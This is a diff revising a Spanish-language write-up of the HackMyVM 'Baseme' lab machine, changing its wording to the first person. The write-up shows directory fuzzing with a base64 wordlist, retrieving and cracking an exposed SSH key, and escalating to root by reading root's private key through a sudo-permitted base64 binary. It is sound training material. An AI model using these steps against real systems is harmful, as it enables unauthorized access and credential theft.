@@ -47,7 +47,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
 ### Curl puerto (80)
-Si lanzamos un curl al servicio web veremos una cadena en base64.
+Lanzo curl al servicio web y veo una cadena en base64.
 ```bash
 ❯ curl -s http://192.168.1.51
 QUxMLCBhYnNvbHV0ZWx5IEFMTCB0aGF0IHlvdSBuZWVkIGlzIGluIEJBU0U2NC4KSW5jbHVkaW5nIHRoZSBwYXNzd29yZCB0aGF0IHlvdSBuZWVkIDopClJlbWVtYmVyLCBCQVNFNjQgaGFzIHRoZSBhbnN3ZXIgdG8gYWxsIHlvdXIgcXVlc3Rpb25zLgotbHVjYXMK
@@ -57,7 +57,7 @@ En el código fuente podemos ver lo siguiente:
 
 ![](/assets/images/hmvm-Baseme/stringsComentario.png)
 
-Vamos a decodificar la cadena de texto encontrada usando nuestra maravillosa terminal.
+Decodifico la cadena de texto encontrada usando mi maravillosa terminal.
 ```bash
 ❯ echo 'QUxMLCBhYnNvbHV0ZWx5IEFMTCB0aGF0IHlvdSBuZWVkIGlzIGluIEJBU0U2NC4KSW5jbHVkaW5nIHRoZSBwYXNzd29yZCB0aGF0IHlvdSBuZWVkIDopClJlbWVtYmVyLCBCQVNFNjQgaGFzIHRoZSBhbnN3ZXIgdG8gYWxsIHlvdXIgcXVlc3Rpb25zLgotbHVjYXMK' | base64 -d
 ```
@@ -68,7 +68,7 @@ Including the password that you need :)
 Remember, BASE64 has the answer to all your questions.
 -lucas
 
-Aquí cualquier persona lanzaría un escaneo de directorios con alguna herramienta tipo wfuzz, gobuster, dirbuster... con varios diccionarios pero ninguno encontrará lo que buscamos porque necesitamos un diccionario en base64, porque en base64? porque lo dice el texto que hemos decodificado:
+Aquí lanzé unos cuantos escaneos de directorios con wfuzz con varios diccionarios pero ninguno encontró nada porque necesitamos un diccionario en base64, porque en base64? porque lo dice el texto que hemos decodificado:
 > ALL, absolutely ALL that you need is in BASE64.
 
 ### Creando script
@@ -81,17 +81,17 @@ for i in $(cat common.txt);
 done
 ```
 
-Usamos el script para crear el diccionario en base64 usando el diccionario common.txt
+Lanzo el script para crear el diccionario en base64 usando el diccionario common.txt
 ```bash
-❯ ./64.sh
+❯ ./TextTo64.sh
 ❯ ls -la
-.rwxr-xr-x noname noname  86 B  Thu Sep 23 17:16:36 2021  64.sh
+.rwxr-xr-x noname noname  86 B  Thu Sep 23 17:16:36 2021  TextTo64.sh
 .rw-r--r-- noname noname 6.4 KB Thu Sep 23 17:20:46 2021  common.txt
 .rw-r--r-- noname noname  11 KB Thu Sep 23 17:21:17 2021  common64.txt
 ```
 
 ### Wfuzz
-Encuentra los directorios `aWRfcnNhCg==`y`cm9ib3RzLnR4dAo=`
+Wfuzz encuentra `aWRfcnNhCg==`y`cm9ib3RzLnR4dAo=`
 ```bash
 ❯ wfuzz -c -t 10 --hc=404 -w common64.txt http://192.168.1.51/FUZZ
 ********************************************************
@@ -109,7 +109,7 @@ ID           Response   Lines    Word       Chars       Payload
 000003550:   200        1 L      1 W        25 Ch       "cm9ib3RzLnR4dAo="
 ```
 
-Decodificamos los directorios
+Decodificamos las cadenas para ver de que se trata.
 ```bash
 ❯ echo 'aWRfcnNhCg==' | base64 -d
 id_rsa
@@ -117,7 +117,7 @@ id_rsa
 robots.txt
 ```
 
-Vamos a visualizar el archivo `robots.txt` para ver su contenido
+Lanzo curl al archivo `robots.txt` para ver su contenido
 ```bash
 ❯ curl -s http://192.168.1.51/cm9ib3RzLnR4dAo=
 Tm90aGluZyBoZXJlIDooCg==
@@ -128,11 +128,11 @@ Obtenemos otra cadena en base64 pero no contiene nada
 Nothing here :(
 ```
 
-Desde el navegador vamos a `http://192.168.1.51/aWRfcnNhCg==` y automáticamente nos aparecerá una ventana para descargar el archivo.
+Con firefox voy a `http://192.168.1.51/aWRfcnNhCg==` y automáticamente se abre una ventana para descargar el archivo.
 
 ![](/assets/images/hmvm-Baseme/id_rsa.png)
 
-Si intentamos usar el id_rsa nos dará error porque esta codificado en base64, antes tenemos que decodificarlo, veamos el id_rsa codificado:
+Si intentamos usar el `id_rsa` nos dará error porque esta codificado en base64, antes tenemos que decodificarlo, veamos el `id_rsa` codificado:
 
 ![](/assets/images/hmvm-Baseme/id_rsaCodificado.png)
 
@@ -140,7 +140,8 @@ id_rsa decodificado
 
 ![](/assets/images/hmvm-Baseme/id_rsaDecodificado.png)
 
-Creamos un nuevo archivo llamado id_rsa con el código decodificado, le damos permisos `chmod 600 id_rsa` e intentamos acceder al servidor SSH
+Creo un nuevo archivo llamado `id_rsa` con el código decodificado, le doy permisos con chmod 600 e intento acceder por SSH.
+
 ```bash
 ❯ ssh -i id_rsa lucas@192.168.1.51
 The authenticity of host '192.168.1.51 (192.168.1.51)' can't be established.
@@ -149,7 +150,7 @@ Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
 Warning: Permanently added '192.168.1.51' (ECDSA) to the list of known hosts.
 Enter passphrase for key 'id_rsa':
 ```
-No podemos conectarnos porque nos pide passhprase me creo un diccionario con las palabras que vimos en el código fuente de la web:
+No puedo conectarme porque me pide passhprase, creo un diccionario con las palabras que vimos en el código fuente de la web:
 
 ![](/assets/images/hmvm-Baseme/nombres.png)
 
@@ -157,15 +158,19 @@ Lanzamos RSAcrack para encontrar el passphrase pero no encuentra nada
 
 ![](/assets/images/hmvm-Baseme/failCrackid_rsa.png)
 
-Modificaremos el script 64.sh para pasar los nombres a base64.
+Modificaremos el script TextTo64.sh para pasar las palabras a base64.
 ```bash
 #!/bin/bash
-for i in $(cat nombres.txt);
-    do echo $i | base64 >> nombres64.txt;
+for i in $(cat palabras.txt);
+    do echo $i | base64 >> palabras64.txt;
 done
 ```
 
-Una vez codificados los nombres intentamos conectarnos de nuevo, ponemos el passphrase `aWxvdmV5b3UK` y conseguimos conectarnos.
+Palabras codificadas a base64.
+
+![](/assets/images/hmvm-Baseme/palabras64.png)
+
+Ya tengo el passphrase y ya puedo conectarme.
 ```bash
 ❯ ssh -i id_rsa lucas@192.168.1.51
 Enter passphrase for key 'id_rsa': 
@@ -181,14 +186,14 @@ Last login: Mon Sep 28 12:51:36 2020 from 192.168.1.58
 lucas@baseme:~$
 ```
 
-Obtenemos la flag user.
+Obtengo la flag user.
 ```bash
 lucas@baseme:~$ cat user.txt 
 HMVXXXXXXAJA
 ```
 
 ### Privesc
-Buscamos todos los comandos que puede ejecutar con sudo.
+Busco todos los comandos que puede ejecutar sudo.
 ```bash
 lucas@baseme:~$ sudo -l
 Matching Defaults entries for lucas on baseme:
@@ -202,11 +207,11 @@ User lucas may run the following commands on baseme:
 Lucas puede ejecutar el binario base64 como root sin usar la contraseña, consultaremos gtfobins.
 ![](/assets/images/hmvm-Baseme/HackMyVM/4_Baseme/gtfobins.png)
 
-Aquí tenemos 2 opciones para obtener la flag de root, una es apuntar a la flag de root `/root/root.txt`o apuntar al archivo id_rsa de root, como queremos hacer las cosas bien apuntaremos al id_rsa de root ;)
+Aquí tenemos 2 opciones para obtener la flag de root, una es apuntar a la flag de root `/root/root.txt`o apuntar al archivo `id_rsa` de root, como quiero hacer las cosas bien apuntaré al `id_rsa` de root ;)
 
 ![](/assets/images/hmvm-Baseme/root_id_rsa.png)
 
-Creo un nuevo archivo en mi máquina id_rsa2 y copio el contenido que he obtenido anteriormente, le doy permisos chmod 600 y me conectod e nuevo por SSH
+Creo un nuevo archivo en mi máquina id_rsa2 y copio el contenido que he obtenido anteriormente, le doy permisos chmod 600 y me conecto de nuevo por SSH
 
 ![](/assets/images/hmvm-Baseme/rootssh.png)
 
